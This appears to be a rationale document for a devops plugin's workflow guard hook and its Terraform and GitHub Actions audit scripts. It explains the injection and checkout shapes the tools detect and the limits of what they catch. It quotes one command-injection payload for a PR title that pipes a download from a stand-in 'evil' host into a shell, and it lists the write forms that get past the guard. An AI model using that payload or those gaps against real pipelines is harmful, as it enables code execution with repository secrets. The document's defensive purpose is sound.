# devops hooks and scripts: the comment text moved out of the code (2026-10-28)

The text below was moved verbatim on 2026-10-28 from the files named in the `##` headings, with only each comment's `# ` leader removed; the lines each file kept are not repeated here. A pointer by name was left in each file, `# Why, limits, history: rationale/derivations/plugin-devops.md § <heading>`. Standing: `recorded` — no gate reads this file, and its dates, measurements and citations are as they stood on the day it moved.

## plugins/devops/hooks/workflow-guard.sh

### Moved 2026-10-28

The comments below left the file on 2026-10-28, verbatim with only the `# ` leader and its indentation removed; each is introduced by the code line it sat above, as that line read on the day it moved.

Header:

```text
Absolute-path shebang (not `env bash`): the fail-open guarantee must hold even
under a stripped/broken PATH, where `env bash` itself exits 127.

PreToolUse guard on writes to .github/workflows/. DENIES exactly two shapes —
the ones with no legitimate form, where the workflow hands repository secrets or
a write token to code the repository does not control:

  1. pull_request_target (or workflow_run) checking out the untrusted head.
  2. An attacker-controlled ${{ github.event.* }} field interpolated into a
     `run:` block, which is shell substitution, not argument passing.

Everything else workflow-audit.sh reports — unpinned actions, a missing
permissions: block, self-hosted runners on fork triggers — is a WARN there and
is NOT denied here. A deny that fires on the ambiguous cases is a deny that gets
turned off, and then the two unambiguous ones stop being blocked too.

Why a hook at all, given both shapes are well-documented: nobody asks. Workflow
files get edited during unrelated work and reviewed for step ordering. The hook
is the thing that asks, at the only moment the answer is cheap.

BASH WRITES (0.8.2). A heredoc body or echo/printf arguments whose pipeline writes an
in-scope file are judged exactly like a Write of that text to that file
(cc_bash_write_chunks for the text, cc_bash_write_targets for the file it lands in; a
relative target matches the relative patterns as spelled). Text fed to a command that
writes no file (`yq eval - <<EOF`, `gh api --input - <<EOF`) is not read. An append
(`>>`) is judged on the appended text alone, as an Edit is on its new_string, so a
rule-1 trigger already in the file whose `ref:` arrives by append is NOT caught.
echo/printf arguments are read as written with ONE leading quote stripped, so
`echo '  - run: …' >> .github/workflows/ci.yml` is judged as its line. An echo chunk is
one line, so it can only ever meet rule 2. NOT caught on an echo: a flag or extra space
before the quote (`echo -n '…'`, `echo  '…'`), `printf '%s\n' '…'` (the format comes
first), a run line that itself holds `<<`, an escaped multi-line echo (`echo -e '…\n…'`,
`$'…'`, not unescaped), and a quoted string spanning lines. Also NOT caught: interpreter
writes (python open(), php file_put_contents), cp/mv/install of a prepared file into
.github/workflows/, `sed -i`/`perl -i` edits (the target resolves, no text is judged),
`{ …; } > f` groups, a path held in a variable, a path relative to an earlier `cd` in
the command or to a session cwd already under .github/ (targets match as spelled), a
here-string, a second heredoc on one line, printf format substitution, and any target
after the first on one writer (`tee a b` checks `a`).

Fail-open: any error, missing jq, or unparseable input allows the write.
CC_WORKFLOW_GUARD unset: the /config option cc_workflow_guard decides.
```

Above `in_scope() {`:

```text
A COMPOSITE ACTION IS THE SAME SINK. `.github/actions/<name>/action.yml` carries
`runs.steps[].run:` and is called from a workflow with that workflow's token, so the
identical `${{ github.event.pull_request.title }}` interpolation is the identical
command execution — and until 2026-09-22 it was allowed here while the same body in
`workflows/ci.yml` was denied. Rule 1 cannot fire on a composite (it has no `on:`
triggers); rule 2 is the whole point. NOT covered: an action.yml anywhere else in the
tree, and a composite that shells out to a script file the guard never sees.
```

Above `if [ -z "$reason" ]; then`:

```text
2. Attacker-controlled expression in a shell step. Matched by LEAF: base.sha
   and number are GitHub-generated and safe, and denying them would make this
   fire on ordinary CI.
```

Above `[ "$(cc_option CC_WORKFLOW_GUARD on)" = "off" ] && exit 0`:

```text
OFF-SWITCH. Until 2026-09-15 this guard had none: the only way out was
uninstalling the plugin. Every other guard in the marketplace ships one,
and a global install makes "turn it off here" a real need.
```

Above `auditroot="${CLAUDE_PLUGIN_ROOT:-$(cd "$(dirname "$0")/.." 2>/dev/null && pwd)}"`:

```text
The path in the message has to be one the READER can type. `plugins/devops/scripts/…`
is this marketplace's own layout and does not exist on an installer's disk; resolve
the real root the host hands the hook, and fall back to this script's own directory.
```

Above `reason="$reason CC_WORKFLOW_GUARD=off turns this check off."`:

```text
Name the escape in the message that blocks you.
```

## plugins/devops/scripts/plan-audit.sh

### Header

Lines 2-12 are what `--help` prints (`sed -n '2,12p'`) and are unchanged; the three-line header follows them.

```text
WHY A SCRIPT AND NOT A `terraform-best-practices` SKILL. A skill restating
Terraform's own documentation is shape 4 in rationale/measured-zero-shapes.md and
measured zero three times over. The thing a model cannot do from memory is read
THIS plan: which of the 300 resource changes in front of it takes data with it.
So this ships as a thing that runs, with an exit code, not a thing that is read.

WHY IT FAILS CLOSED. Every hook in this marketplace fails OPEN and says so in its
own header, because a guard that wedges a session gets uninstalled. This is not a
hook: nothing invokes it on a keystroke, its output is read by a human or a CI
step, and the only other thing it could say about a plan it cannot parse is
"clean". So a parse error exits 1 and never 0.

WHAT IT CATCHES
  1. A `delete` — or a replace, which is a delete plus a create — of a resource
     whose type is on the stateful list below. `--list-types` prints it.
  2. `lifecycle.prevent_destroy = true` removed from a resource since --base.
     This one is read from the .tf SOURCE, not from the plan: lifecycle is
     configuration Terraform does not record in state and does not emit in the
     JSON plan, so `configuration.root_module.resources[].expressions` has no
     `lifecycle` key to read (verified 2026-09-22 against
     developer.hashicorp.com/terraform/internals/json-format and
     hashicorp/terraform#30271). A plan-only check for it would be theater.

WHAT IT DOES NOT CATCH
  - A resource type that is not on the list: another provider (DigitalOcean,
    Oracle, Alicloud), a stateful type nobody added (`aws_rds_cluster_instance`,
    `aws_elasticache_replication_group`), or a module that wraps the storage in a
    type of its own. Module nesting itself is fine — `resource_changes` carries the
    real type and the full `module.x.` address — but a wrapper that owns the data
    under an unlisted type reads as ordinary.
  - Data loss inside an `update`. No delete action appears for a shrunk
    `allocated_storage`, an engine downgrade, `skip_final_snapshot` flipped to
    true, or a `force_destroy` newly set — all of those plan as in-place changes.
  - A `moved` block, which is an address change: the plan says no-op and there is
    nothing to find. (Good — that is the point of `moved`.)
  - Whether the destroy is RECOVERABLE. A final snapshot, `deletion_protection`,
    bucket versioning and PITR are not modelled; a listed type being destroyed is a
    finding even when the backup makes it survivable.
  - A `helm_release` whose PVC comes from the chart's own defaults with no mention
    in the release's values. Only values/set text is scanned.
  - Anything about a plan that is stale, or about drift since it was generated. It
    reads the file it is handed and does not run Terraform.

Panel finding 43 (rationale/specialist-panel-2026-09-22.md §2, ops detail 9): the
marketplace had no IaC lane at all, and the mechanism-bearing slice of that gap is
this reader — not a terraform skill.
```

### The stateful list as data

```text
type <TAB> why it is stateful. Kept as data so --list-types and the finding lines
read from one source.
```

### helm_release, the conditional row

```text
helm_release is the one conditional row: most releases are stateless and flagging
every one of them is how a gate gets switched off. Matched against the release's
values/set text only — see WHAT IT DOES NOT CATCH.
```

### -r, not -f

```text
-r, not -f: `plan-audit.sh <(terraform show -json plan.out)` hands over a
/dev/fd entry, which is not a regular file.
```

### prevent_destroy as a set difference

```text
Set difference, not a diff-hunk read: an address protected at $base and no longer
protected in the working tree is a finding whether the line was deleted, flipped to
false, or the whole resource block was removed from the configuration — that last
one is how a protected resource gets destroyed in practice. Only files the diff
touches are read, so a move between two changed files does not read as a removal.
```

## plugins/devops/scripts/workflow-audit.sh

### Header

Lines 2-20 are what `--help` prints (`sed -n '2,20p'`) and are unchanged; the limitation paragraph they open now ends in two lines and the pointer.

```text
or a reusable workflow called with `secrets: inherit`. Composites ARE read as of
2026-09-22, but only for rules 2 (expression injection) and 3 (unpinned `uses:`):
rules 1, 4, 5 and 6 are about a workflow's triggers, top-level `permissions:` and
runner, none of which a composite has, so applying them there would warn on every
composite in existence. Treat a clean run as "none of the known shapes are
present in these files", never as "this pipeline is safe".
```

### The composite-action root

```text
Second root: composite actions live beside the workflows dir, one per directory. A
composite runs with the CALLING workflow's token, so an injected expression in its
`run:` is the same critical shape — it was simply never read here.
```

### Workflow-only rules

```text
Composite or workflow? Rules 1, 4, 5 and 6 read triggers, top-level permissions: and
runs-on — fields a composite does not have — so they stay workflow-only.
```

### Rule 1

```text
1. CRITICAL — pull_request_target / workflow_run that checks out a ref.
   The trigger runs with the BASE repo's secrets and a write token; checking
   out the PR head then executes fork-authored code inside that context. This
   is GitHub's own documented critical anti-pattern and it reads, to a
   reviewer skimming for correctness, as "checks out the PR — correct".
```

### Rule 2

```text
2. CRITICAL — an ATTACKER-CONTROLLED expression interpolated into a run:
   block. The value is substituted into the shell before it runs, so a PR
   title of `"; curl evil | sh; #` is command execution, not a string.

   Matched by LEAF, not by prefix. `github.event.pull_request.*` as a whole is
   the wrong unit: `base.sha` and `number` are GitHub-generated and safe, and
   flagging them makes the rule cry wolf on ordinary CI — which is how a gate
   gets switched off. Only fields a PR author can type are listed. (Found by
   running this against its own repo: the first draft flagged
   `${{ github.event.pull_request.base.sha }}`, a 40-char SHA nobody controls.)
```

### Rule 3

```text
3. WARN — third-party action pinned to a mutable tag. devops-practices already
   teaches no-`latest` for base images; a git tag is equally mutable and the
   action runs with the job's full token.
```

### Rule 4

```text
4. WARN — no top-level permissions:. Without it the job inherits the repo
   default, which on many repos is still write-all.
```

### Rule 5

```text
5. WARN — self-hosted runner on a fork-reachable trigger. A fork PR then runs
   on infrastructure the repo owns, with whatever state the last job left.
```

### Rule 6

```text
6. WARN — script injection's quieter cousin: secrets used in a job whose
   trigger a fork can reach.
```

